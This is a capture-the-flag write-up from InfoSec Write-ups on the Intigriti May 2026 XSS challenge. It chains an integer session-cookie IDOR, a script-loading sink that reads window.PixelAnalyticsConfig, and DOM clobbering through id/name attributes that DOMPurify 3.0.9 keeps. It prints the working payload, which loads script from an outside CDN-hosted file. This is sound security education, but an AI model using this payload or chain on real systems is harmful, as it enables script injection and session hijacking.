---
title: How I Chained Three Bugs to XSS an Intigriti CTF — IDOR + DOM Clobbering + DOMPurify 3.0.9 Bypass
url: https://infosecwriteups.com/how-i-chained-three-bugs-to-xss-an-intigriti-ctf-idor-dom-clobbering-dompurify-3-0-9-bypass-25b74fc7afc7?source=rss----7b722bfd1b8d--bug_bounty
source: Bug Bounty in InfoSec Write-ups on Medium
date: 2026-08-26
fetch_date: 2026-08-27T12:12:37.136268
---

# How I Chained Three Bugs to XSS an Intigriti CTF — IDOR + DOM Clobbering + DOMPurify 3.0.9 Bypass

[Sitemap](/sitemap/sitemap.xml)

[Open in app](https://play.google.com/store/apps/details?id=com.medium.reader&referrer=utm_source%3DmobileNavBar&source=---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Finfosecwriteups.com%2Fhow-i-chained-three-bugs-to-xss-an-intigriti-ctf-idor-dom-clobbering-dompurify-3-0-9-bypass-25b74fc7afc7&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

[Medium Logo](https://medium.com/?source=---top_nav_layout_nav-----------------------------------------)

Get app

[Write](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav------------------)

[Search](https://medium.com/search?source=---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Finfosecwriteups.com%2Fhow-i-chained-three-bugs-to-xss-an-intigriti-ctf-idor-dom-clobbering-dompurify-3-0-9-bypass-25b74fc7afc7&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

![Unknown user](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)

[## InfoSec Write-ups](https://infosecwriteups.com/?source=post_page---publication_nav-7b722bfd1b8d-25b74fc7afc7---------------------------------------)

·

[![InfoSec Write-ups](https://miro.medium.com/v2/resize:fill:76:76/1*SWJxYWGZzgmBP1D0Qg_3zQ.png)](https://infosecwriteups.com/?source=post_page---post_publication_sidebar-7b722bfd1b8d-25b74fc7afc7---------------------------------------)

A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: <https://weekly.infosecwriteups.com/>

Press enter or click to view image in full size

![]()

[Intigriti](https://medium.com/tag/intigriti?source=post_page---header_tags--25b74fc7afc7---------------------------------------)

[Capture The Flag](https://medium.com/tag/capture-the-flag?source=post_page---header_tags--25b74fc7afc7---------------------------------------)

[Bug Bounty](https://medium.com/tag/bug-bounty?source=post_page---header_tags--25b74fc7afc7---------------------------------------)

[Ctf Writeup](https://medium.com/tag/ctf-writeup?source=post_page---header_tags--25b74fc7afc7---------------------------------------)

# **How I Chained Three Bugs to XSS an Intigriti CTF — IDOR + DOM Clobbering + DOMPurify 3.0.9 Bypass**

[![Prateekpulastya](https://miro.medium.com/v2/resize:fill:64:64/1*I0wFxynbuCSzv-GsCga6iQ.jpeg)](https://prateekpulastya.medium.com/?source=post_page---byline--25b74fc7afc7---------------------------------------)

[Prateekpulastya](https://prateekpulastya.medium.com/?source=post_page---byline--25b74fc7afc7---------------------------------------)

4 min read

·

May 25, 2026

--

[Listen](https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2Fplans%3Fdimension%3Dpost_audio_button%26postId%3D25b74fc7afc7&operation=register&redirect=https%3A%2F%2Finfosecwriteups.com%2Fhow-i-chained-three-bugs-to-xss-an-intigriti-ctf-idor-dom-clobbering-dompurify-3-0-9-bypass-25b74fc7afc7&source=---header_actions--25b74fc7afc7---------------------post_audio_button------------------)

Share

*Intigriti May 2026 XSS Challenge — full write-up*

I spent a few hours on the Intigriti May 2026 challenge and ended up `alert(document.domain)` firing in headless Chromium. No single bug did it alone. The interesting part was discovering how three separate issues connected into a single working chain.

Here’s what the target looked like and how the chain came together.

Press enter or click to view image in full size

![]()

Flowchart

**The target**

The challenge runs at `challenge-0526.intigriti.io/challenge` — a Node.js + Express single-page application with hash-based routing. All rendering happens client-side through `/js/app.js`. DOMPurify 3.0.9 is loaded from CDNJS.

I started by mapping the API surface:

Press enter or click to view image in full size

![]()

**Bug 1: Sequential session IDs**

The very first thing I checked was the session cookie format. After registering:

```
Set-Cookie: session=1842; Path=/; HttpOnly
```

A plain integer. No HMAC. No token entropy. I set `session=1` and hit`/api/me`: json

```
{"username": "admin", "name": "..."}
```

Admin. That fast. This is a textbook IDOR — any integer maps to a valid account, and nothing stops you from trying them.

At this point, I had admin access, but no idea how to turn it into XSS. That came from reading `app.js`.

**Bug 2: The tracker reads from** `window`

Near the bottom of `loadTestimonials()`, I found this:

javascript

```
let config = window.PixelAnalyticsConfig || { enabled: false, scriptUrl: '/js/mock-tracker.js' };
if (config.enabled) {
    let s = document.createElement('script');
    s.src = config.scriptUrl;
    document.body.appendChild(s);
}
```

The app checks `window.PixelAnalyticsConfig` to decide what analytics script to load. If that global is truthy and has a`scriptUrl`, it appends a `<script>` tag pointing there. This is the XSS sink. The question is: can you control `window.PixelAnalyticsConfig`?

**Bug 3: DOMPurify 3.0.9 doesn’t strip** `id` **or** `name`

Testimonials render like this: JavaScript

```
textDiv.innerHTML = DOMPurify.sanitize(t.content);
```

DOMPurify removes `<script>` tags, event handlers, `javascript:` hrefs — the obvious stuff. But in version 3.0.9, it does not strip `id` or `name` attributes. The `SANITIZE_DOM` Protection that handles this was added in 3.1.0.

## Get Prateekpulastya’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Subscribe

[x]

Remember me for faster sign in

So this input survives sanitization:

html

```
<a id="PixelAnalyticsConfig"></a>
<a id="PixelAnalyticsConfig" name="enabled"></a>
<a id="PixelAnalyticsConfig" name="scriptUrl" href="https://cdn.jsdelivr.net/gh/renniepak/xss@main/xss.js"></a>
```

When multiple elements share the same`id`, the browser exposes them as an `HTMLCollection` at `window[id]`. Named members of that collection are accessible as properties. So: JavaScript

```
window.PixelAnalyticsConfig           // HTMLCollection — truthy ✓
window.PixelAnalyticsConfig.enabled   // <a name="enabled"> — truthy ✓
window.PixelAnalyticsConfig.scriptUrl // <a name="scriptUrl" href="CDN">
window.PixelAnalyticsConfig.scriptUrl.toString() // → CDN URL (anchor coerces to href)
```

When the tracker code does`s.src = config.scriptUrl`, it's assigning an anchor element to `src`. The browser coerces it to a string via`.toString()`, which returns the `href`. CDN file loads. `alert(document.domain)` fires.

**Why the IDOR was actually necessary**

This is the part that took me a minute to think through. The `/api/testimonials` endpoint returns only the current session's testimonials. Cross-user visibility doesn't exist. If I posted a payload under my own account and logged in as someone else, they'd see an empty testimonials list — no trigger.

The IDOR closes this gap. By setting `session=1`I'm both posting *and* viewing as admin. The payload is present and rendered in the same session.

Without IDOR, the DOM clobbering technique is still available, but it’s a self-XSS. The IDOR makes it persistent and potentially exploitable against any target you can get to visit the page, provided they have the right session cookie.

**The full chain**

```
session=1 (IDOR)
  → POST /api/testimonials with <a id="PixelAnalyticsConfig" ...> payload
    → DOMPurify 3.0.9 keeps id/name attrs
      → window.PixelAnalyticsConfig = HTMLCollection (truthy)
        → tracker reads config.scriptUrl → CDN URL
          → <script src="CDN"> appended
            → a...